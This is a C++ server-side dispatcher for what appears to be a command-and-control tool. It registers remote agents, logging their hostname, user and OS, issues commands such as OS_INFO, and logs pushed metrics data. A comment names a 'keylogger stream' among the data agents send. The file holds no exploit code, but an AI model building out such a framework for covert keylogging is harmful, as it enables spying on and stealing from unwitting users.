#include "server_dispatcher.hpp"

#include <iostream>
#include <sstream>
#include <stdexcept>

#include "logger.hpp"
#include "protocol/metrics_parser.hpp"
#include "protocol/protocol_helper.hpp"
#include "protocol/protocol_parser.hpp"
#include "protocol/protocol_serializer.hpp"
#include "socket/i_socket.hpp"
// ServerDispatcher::ServerDispatcher() {}
ServerDispatcher::ServerDispatcher() : Dispatcher("server") {}

void ServerDispatcher::handleFrame(AgentSession& agent, const Frame& frame) {
  switch (frame.header.type) {
    case MessageType::REGISTER:
      onRegister(agent, frame.payload);
      break;
    case MessageType::RESPONSE:
      onResponse(agent, frame.payload);
      break;
    case MessageType::DATA:
      onData(frame.payload);
      break;
    // case MessageType::DISCONNECT:
    //   running = false;
    //   break;
    case MessageType::ERROR:
      onError(frame.payload);
      break;
    default:
      sendError(agent, ErrorType::UNKNOWN_TYPE, "Unexpected message type");
  }
}

// ── Incoming handlers ────────────────────────────────────────

// The first message from the agent must always be REGISTER.
// Once we know who it is, we kick off the command sequence.
void ServerDispatcher::onRegister(AgentSession& agent,
                                  const std::vector<std::uint8_t>& payload) {
  RegisterPayload agentInfo = ProtocolParser::parseRegisterPayload(payload);
  agent.setAgentInfo(agentInfo);
  // agent.setRegistered(true);
  std::ostringstream what;
  what << "[REGISTER] hostname=" << agentInfo.hostname
       << " user="<< agentInfo.current_user
       << "  os=" << static_cast<int>(agentInfo.os_type)
       << "  arch=" << static_cast<int>(agentInfo.arch)
       <<" version=" <<agentInfo.os_version;
  logger_.info(what.str());
  // std::cout << "[← REGISTER] hostname=" << agentInfo.hostname
  //           << "  os=" << static_cast<int>(agentInfo.os_type)
  //           << "  arch=" << static_cast<int>(agentInfo.arch) << "\n";

  // First command: ask the agent for OS info.
  sendCommand(agent, CommandType::OS_INFO);
}

// A RESPONSE carries the same id as the COMMAND it answers,
// plus chunk metadata for large payloads split across messages.
void ServerDispatcher::onResponse(AgentSession& agent,
                                  const std::vector<std::uint8_t>& payload) {
  const ResponsePayload response =
      ProtocolParser::parseResponsePayload(payload);
  std::ostringstream what;

  what << "[RESPONSE] id=" << response.id
       << "  chunk=" << static_cast<int>(response.chunk_index) + 1 << "/"
       << static_cast<int>(response.total_chunks)
       << "  status=" << static_cast<int>(response.status) << "\n"
       << ProtocolParser::toString(response.data);

  logger_.info(what.str());
  // std::cout << "[← RESPONSE] id=" << response.id
  //           << "  chunk=" << static_cast<int>(response.chunk_index) + 1 <<
  //           "/"
  //           << static_cast<int>(response.total_chunks)
  //           << "  status=" << static_cast<int>(response.status) << "\n"
  //           << response.data << "\n";

  // Only act once all chunks of this response have arrived.
  const bool lastChunk = response.chunk_index + 1 == response.total_chunks;
  // if (lastChunk) sendDisconnect(agent);
  // → To send more commands, push them here instead of disconnecting.
}

// DATA messages are pushed by the agent without a prior COMMAND
// (e.g. keylogger stream). Handle them independently of the
// request/response cycle.
void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
  const DataPayload data = ProtocolParser::parseDataPayload(payload);
  std::ostringstream what;
  what << "[DATA] subtype=" << static_cast<int>(data.subtype) << "\n";
  if (data.subtype == DataType::METRICS_SAMPLE) {
    MetricsSample sample = MetricsParser::parseMetricsSample(data.data);

    what << "[DATA] METRICS_SAMPLE\n";

    what << "CPU: " << sample.cpu.total_percent << "%\n";
    what << "CPU cores: ";
    for (float core : sample.cpu.per_core) what << core << "% ";
    what << '\n';

    what << "Memory: " << sample.mem.phys_used << "/" << sample.mem.phys_total
         << " bytes used\n";

    for (const auto& disk : sample.disks) {
      what << "Disk " << disk.device << " R=" << disk.read_bytes_per_sec
           << " W=" << disk.write_bytes_per_sec << '\n';
    }

    for (const auto& iface : sample.interfaces) {
      what << "Net " << iface.iface << " RX=" << iface.rx_bytes_per_sec
           << " TX=" << iface.tx_bytes_per_sec << '\n';
    }
  }
  logger_.info(what.str());
  // std::cout << "[← DATA] subtype=" << static_cast<int>(data.subtype) << "\n"
  //           << data.data << "\n";
}

// ── Outgoing senders ─────────────────────────────────────────

void ServerDispatcher::sendCommand(AgentSession& agent, CommandType type,
                                   const std::string& data) {
  CommandPayload command;
  command.id = nextId();
  command.type = type;
  command.data = data;
  const std::vector<std::uint8_t> payload =
      ProtocolSerializer::serializeCommandPayload(command);

  Frame frame = {ProtocolHelper::createHeader(MessageType::COMMAND, payload),
                 payload};
  // sendFrame(agent, frame);
  agent.sendFrame(frame);
  // sendRaw(agent, MessageType::COMMAND, payload);
  std::ostringstream what;
  what << "[COMMAND] id=" << command.id
       << "  type=" << static_cast<int>(command.type);
  logger_.info(what.str());
  // std::cout << "[→ COMMAND] id=" << command.id
  //           << "  type=" << static_cast<int>(command.type) << "\n";
}

void ServerDispatcher::sendDisconnect(AgentSession& agent) {
  const std::vector<uint8_t> payload{};
  Frame frame = {ProtocolHelper::createHeader(MessageType::DISCONNECT, payload),
                 payload};
  // sendRaw(agent, MessageType::DISCONNECT);
  // sendFrame(agent, frame);
  agent.sendFrame(frame);
  logger_.info("[DISCONNECT]");
  // std::cout << "[→ DISCONNECT]\n";
  //   running = false;
}

std::uint16_t ServerDispatcher::nextId() { return nextCmdId_++; }